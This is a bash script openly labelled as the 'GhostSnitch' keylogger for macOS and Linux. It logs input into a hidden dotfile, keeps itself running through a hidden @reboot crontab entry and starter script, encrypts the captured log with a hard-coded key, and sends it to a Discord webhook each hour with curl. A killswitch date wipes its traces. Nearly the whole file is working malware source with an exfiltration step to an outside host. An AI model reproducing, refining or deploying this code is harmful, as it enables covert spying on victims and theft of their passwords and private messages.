#!/bin/bash
# GhostSnitch Keylogger for macOS/Linux
# Author: TBJr
# Version: 1.0
# Description: AES-encrypted keystroke logger with Discord exfil and stealth crontab persistence

DISCORD_WEBHOOK="https://discord.com/api/webhooks/XXXX/XXXX"
KILLSWITCH_EPOCH=$(date -d "2025-12-31 23:59:00" +%s)
LOGFILE="$HOME/.local/share/.sysdump-$(uuidgen | cut -d'-' -f1)"
ENCRYPTED_LOG="$LOGFILE.enc"
KEY="MyS3cr3tK3y12345"

mkdir -p "$(dirname "$LOGFILE")"

# Capture keystrokes using script command (fallback for logkeys)
script -q -f -c "cat" "$LOGFILE" &

# Persist using crontab
(crontab -l 2>/dev/null; echo "@reboot bash $HOME/.local/share/.kl_start.sh") | sort -u | crontab -

# Write starter script
cat <<EOF > $HOME/.local/share/.kl_start.sh
#!/bin/bash
bash $(realpath "$0") &
EOF
chmod +x $HOME/.local/share/.kl_start.sh

# Background monitor
while true; do
  NOW_EPOCH=$(date +%s)
  if [[ $NOW_EPOCH -ge $KILLSWITCH_EPOCH ]]; then
    rm -f "$LOGFILE" "$ENCRYPTED_LOG"
    crontab -l | grep -v '.kl_start.sh' | crontab -
    exit 0
  fi

  if [[ -f "$LOGFILE" ]]; then
    openssl enc -aes-128-cbc -salt -in "$LOGFILE" -out "$ENCRYPTED_LOG" -pass pass:"$KEY"
    curl -s -X POST -F "file=@$ENCRYPTED_LOG" "$DISCORD_WEBHOOK" > /dev/null
    rm -f "$LOGFILE" "$ENCRYPTED_LOG"
  fi
  sleep 3600
done
